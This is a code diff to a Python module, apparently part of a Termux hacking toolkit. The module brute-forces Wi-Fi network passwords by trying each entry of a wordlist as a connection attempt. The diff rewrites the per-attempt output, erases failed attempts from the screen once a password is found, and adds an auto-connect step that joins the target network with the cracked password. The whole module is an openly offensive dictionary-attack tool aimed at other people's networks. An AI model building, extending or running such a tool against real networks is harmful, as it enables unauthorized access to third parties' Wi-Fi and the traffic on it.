@@ -6,8 +6,12 @@ modules.attack.wifi_crack — Подбор пароля от Wi-Fi.
   • пользователь выбирает цель (сеть) и словарь;
   • каждый пароль из словаря проверяется подключением к сети,
     шаг подбора — каждые 0.1 секунды;
+  • каждый пароль печатается ОТДЕЛЬНОЙ СТРОКОЙ с итогом [WRONG]/[OK];
   • нажатие ENTER в любой момент останавливает подбор и возвращает в меню;
-  • при успехе пароль выводится и подбор останавливается.
+  • при находке верного пароля ВСЕ неверные строки удаляются с экрана
+    (ANSI-эскейпы A), остаётся только правильная строка с паролем;
+  • после находки предлагается АВТОПОДКЛЮЧЕНИЕ к сети
+    (termux-wifi-connect найденным паролем).
 
 Словари лежат в папке wordlists/ проекта:
   pn_e00001.txt  — цифры, easy pass
@@ -296,6 +300,68 @@ def _save_result(ssid, pwd, demo_note=False):
     print(f"{C.DIM}  Итог сохранён в logs/wifi_crack.log{C.RESET}")
 
 
+# ─────────────── вывод «пароль — итог» построчно ───────────────
+
+MAX_LOG_LINES = 15   # сколько последних строк держим на экране
+
+
+def print_attempt(i, total, pwd, ok):
+    """Печатает ОДНУ строку: № · пароль · итог [WRONG]/[OK].
+
+    Каждая попытка — новая строка (без перезаписи прогресс-бара).
+    Возвращает True, если строка была выведена.
+    """
+    if ok:
+        tag = f"{C.GREEN}{C.BOLD}[OK]    ВЕРНЫЙ{C.RESET}"
+    else:
+        tag = f"{C.RED}[WRONG] НЕ ВЕРНЫЙ{C.RESET}"
+    line = (f"  {C.DIM}{i:>7}/{total:<7}{C.RESET} "
+            f"{C.YELLOW}{pwd[:24]:<24}{C.RESET} {tag}")
+    print(line)
+    return True
+
+
+def wipe_wrong_lines(n):
+    """Удаляет n предыдущих строк с экрана (ANSI CSI A + K + J).
+
+    Используется при находке верного пароля: все неверные строки
+    стираются, остаётся только правильная. Если терминал не поддерживает
+    эскейпы — просто печатается разделитель.
+    """
+    if n <= 0:
+        return
+    seq = "\x1b[F\x1b[2K" * n + "\x1b[J"
+    sys.stdout.write(seq)
+    sys.stdout.flush()
+
+
+def auto_connect(ssid, pwd):
+    """Предлагает автоподключение к сети найденным паролем (Termux:API)."""
+    print(f"\n{C.CYAN}  Автоподключение к «{ssid}» найденным паролем?{C.RESET}")
+    ans = input(f"{C.GREEN}  y — подключиться / Enter — пропустить: {C.RESET}").strip().lower()
+    if ans != "y":
+        print(f"{C.DIM}  Пропущено.{C.RESET}")
+        return False
+    exe = api_bin("termux-wifi-connect")
+    if exe is None:
+        print(f"{C.RED}  [x] Termux:API недоступен — подключение невозможно.{C.RESET}")
+        return False
+    import subprocess
+    cmd = [exe, "--ssid", ssid] + ([f"--pwd", pwd] if pwd else [])
+    try:
+        r = subprocess.run(cmd, capture_output=True, text=True, timeout=30,
+                           stdin=subprocess.DEVNULL)
+        out = ((r.stdout or "") + (r.stderr or "")).lower()
+    except Exception as e:
+        print(f"{C.RED}  [x] Ошибка подключения: {e}{C.RESET}")
+        return False
+    if "connected" in out:
+        print(f"{C.GREEN}{C.BOLD}  [ok] Подключено к «{ssid}».{C.RESET}")
+        return True
+    print(f"{C.RED}  [x] Не удалось подключиться: {out.strip()[:120]}{C.RESET}")
+    return False
+
+
 # ─────────────── остановка по ENTER ───────────────
 
 def _start_enter_stop():
@@ -349,6 +415,7 @@ def run_attack(ssid, dict_path, demo=False):
     start = time.time()
     found = None
     stopped_by_user = False
+    printed_lines = 0          # сколько строк-попыток выведено на экран
     _, stop = _start_enter_stop()
     try:
         for i, pwd in enumerate(passwords, 1):
@@ -366,21 +433,14 @@ def run_attack(ssid, dict_path, demo=False):
                 else:
                     ok = bool(r)
             if not real_mode:
-                # демо: имитируем проверку с шагом 0.1 сек
+                # демо: имитируем проверку с шагом 0.1 сек (всегда неверно)
                 if stop.wait(DELAY):
                     stopped_by_user = True
                     break
 
-            elapsed = time.time() - start
-            speed = i / elapsed if elapsed > 0 else 0
-            bar_len = 24
-            filled = int(bar_len * i / total)
-            bar = "█" * filled + "░" * (bar_len - filled)
-            sys.stdout.write(
-                f"\r  {C.CYAN}[{bar}]{C.RESET} {i}/{total} "
-                f"({i * 100 // total}%) · {pwd[:18]:<18} · {speed:.1f} п/с  "
-            )
-            sys.stdout.flush()
+            # ── каждая попытка — новой строкой с итогом ──
+            print_attempt(i, total, pwd, ok)
+            printed_lines += 1
 
             if ok:
                 found = pwd
@@ -400,8 +460,17 @@ def run_attack(ssid, dict_path, demo=False):
     if stopped_by_user:
         print(f"\n{C.YELLOW}  [X] Подбор остановлен (ENTER) — возврат в меню.{C.RESET}")
     if found:
-        print(f"\n{C.GREEN}{C.BOLD}  [ok] ПАРОЛЬ НАЙДЕН: {found}{C.RESET}")
+        # ── удаляем все неверные строки, оставляем только верный пароль ──
+        wipe_wrong_lines(printed_lines)
+        print(f"{C.CYAN}  {'═' * 46}{C.RESET}")
+        print(f"{C.GREEN}{C.BOLD}  [OK] ВЕРНЫЙ ПАРОЛЬ НАЙДЕН:{C.RESET} "
+              f"{C.BOLD}{found}{C.RESET}")
+        print(f"  {C.DIM}все неверные строки удалены · проверено попыток: "
+              f"{printed_lines}{C.RESET}")
+        print(f"{C.CYAN}  {'═' * 46}{C.RESET}")
         _save_result(ssid, found)
+        if real_mode:
+            auto_connect(ssid, found)      # запрос автоподключения к сети
     elif not real_mode and not stopped_by_user:
         print(f"\n{C.DIM}  Демо-прогон завершён: реальных подключений не выполнялось."
               f"\n  Для боевого режима установите Termux:API (pkg install termux-api"
